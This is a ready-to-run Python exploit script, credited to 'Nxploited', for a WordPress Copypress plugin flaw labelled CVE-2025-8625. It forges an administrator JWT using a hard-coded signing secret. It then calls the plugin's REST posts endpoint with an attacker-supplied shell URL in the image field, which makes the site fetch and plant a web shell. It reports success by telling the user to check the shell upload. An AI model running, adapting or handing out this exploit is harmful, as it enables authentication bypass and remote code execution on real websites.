#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# By Nxploited ( Khaled Alenazi )

import argparse
import requests
import base64
import hmac
import hashlib
import json
import time
import urllib3
urllib3.disable_warnings()

def _b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _jwt_header():
    return {"typ": "JWT", "alg": "HS256"}

def _jwt_payload(site_url, user_id, username, email):
    issued_at = int(time.time())
    expiration = issued_at + 3600
    return {
        "iss": site_url,
        "iat": issued_at,
        "exp": expiration,
        "data": {
            "user_id": user_id,
            "username": username,
            "email": email
        }
    }

def _jwt_signature(header, payload, secret):
    h = _b64url(json.dumps(header, separators=(',', ':')).encode())
    p = _b64url(json.dumps(payload, separators=(',', ':')).encode())
    raw_sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    s = _b64url(raw_sig.encode() if isinstance(raw_sig, str) else raw_sig)
    return f"{h}.{p}.{s}"

def Nxploited_jwt(site_url, user_id, username, email, secret):
    header = _jwt_header()
    payload = _jwt_payload(site_url, user_id, username, email)
    return _jwt_signature(header, payload, secret)

def Nxploited_post(site, jwt_token, shell_url):
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {jwt_token}",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
    }
    post_endpoint = f"{site}/wp-json/copypress-api/v1/posts"
    post_data = {
        "title": "Test",
        "content": "PoC",
        "image": shell_url
    }
    resp = requests.post(post_endpoint, json=post_data, headers=headers, verify=False)
    return resp

def Nxploited():
    parser = argparse.ArgumentParser(description="Copypress REST API CVE-2025-8625 exploit")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-shell", "--shell", required=True)
    args = parser.parse_args()
    site = args.url.rstrip('/')
    secret = "826657a98e396172f8aed51d110d529d"
    user_id = 1
    username = "superadmin1"
    email = "nxploitadmin@example.com"
    jwt_token = Nxploited_jwt(site, user_id, username, email, secret)
    resp = Nxploited_post(site, jwt_token, args.shell)
    print(f"JWT: {jwt_token}")
    print(f"HTTP {resp.status_code}: {resp.text}")
    if resp.status_code in [200, 201] and "created" in resp.text:
        print("Exploit success! Check your shell upload.")
    else:
        print("Exploit failed. Check JWT payload, endpoint, or target protection.")

if __name__ == "__main__":
    Nxploited()
